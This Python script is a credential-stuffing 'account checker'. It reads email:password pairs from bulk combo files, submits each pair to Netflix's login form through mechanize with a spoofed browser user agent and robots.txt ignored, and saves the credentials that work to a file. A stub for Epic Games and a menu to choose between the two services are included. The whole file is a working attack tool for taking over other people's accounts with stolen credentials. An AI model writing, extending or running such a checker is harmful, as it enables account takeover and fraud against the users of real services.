import time
import os

def get_browser():
    try:
        import mechanize
        br = mechanize.Browser()
        br.set_handle_equiv(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        br.addheaders = [('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36')]
        return br
    except Exception as e:
        print(f"Error initializing browser: {e}")
        # Try a direct import if the above fails
        try:
            from mechanize import Browser
            br = Browser()
            br.set_handle_robots(False)
            br.addheaders = [('User-agent', 'Firefox')]
            return br
        except Exception as inner_e:
            print(f"Failed to initialize mechanize: {inner_e}")
            print("Trying to install mechanize...")
            os.system("python3 -m pip install mechanize --break-system-packages")
            try:
                import mechanize
                return mechanize.Browser()
            except:
                return None

def save_results(filename, results):
    with open(filename, 'a') as f:
        for account in results:
            f.write(account + '\n')

def check_netflix():
    print('[+]---Netflix Account Checker---[+]')
    
    if os.path.exists('attached_assets/netflix_bulk_1767373550930.txt'):
        with open('attached_assets/netflix_bulk_1767373550930.txt', 'r') as src, open('listAcc.txt', 'w') as dst:
            dst.write(src.read())

    contex = 0
    contno = 0
    accPass = []
    
    br = get_browser()
    if not br: return

    try:
        with open("listAcc.txt", "r") as filestream:
            for line in filestream:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                
                currentline = line.split(':')
                email = currentline[0]
                password = currentline[1]
                
                print(f'Checking Netflix: {email}')
                try:
                    br.open('https://www.netflix.com/fr/login')
                    br.select_form(nr=0)
                    br.form['userLoginId'] = email
                    br.form['password'] = password
                    response = br.submit()
                    
                    if 'browse' in response.geturl():
                        print('Account Works!')
                        contex += 1
                        accPass.append(line)
                        br.open('https://www.netflix.com/SignOut?lnkctr=mL')
                    else:
                        print('Account does not work')
                        contno += 1
                except Exception as e:
                    print(f'Error checking {email}: {e}')
                
                time.sleep(1)
    except FileNotFoundError:
        print("listAcc.txt not found")
    
    save_results('worksAcc_netflix.txt', accPass)
    print(f'Netflix - Active: {contex}, Dead: {contno}')

def check_epic_games():
    print('\n[+]---Epic Games Account Checker---[+]')
    
    if os.path.exists('attached_assets/epicgames_bulk_1767373551032.txt'):
        with open('attached_assets/epicgames_bulk_1767373551032.txt', 'r') as src, open('listAcc.txt', 'w') as dst:
            dst.write(src.read())

    contex = 0
    contno = 0
    accPass = []
    
    br = get_browser()
    if not br: return

    try:
        with open("listAcc.txt", "r") as filestream:
            for line in filestream:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                
                currentline = line.split(':')
                email = currentline[0]
                password = currentline[1]
                
                print(f'Checking Epic Games: {email}')
                try:
                    br.open('https://www.epicgames.com/id/login')
                    print('Attempting Epic Games login...')
                    print('Note: Epic Games often blocks automated tools without browser emulation.')
                    contno += 1 
                except Exception as e:
                    print(f'Error checking {email}: {e}')
                
                time.sleep(1)
    except FileNotFoundError:
        print("listAcc.txt not found")

    save_results('worksAcc_epic.txt', accPass)
    print(f'Epic Games - Results saved to worksAcc_epic.txt')

if __name__ == "__main__":
    print("Select Checker:")
    print("1. Netflix")
    print("2. Epic Games")
    choice = input("Choice: ")
    
    if choice == "1":
        check_netflix()
    elif choice == "2":
        check_epic_games()
    else:
        print("Invalid choice")
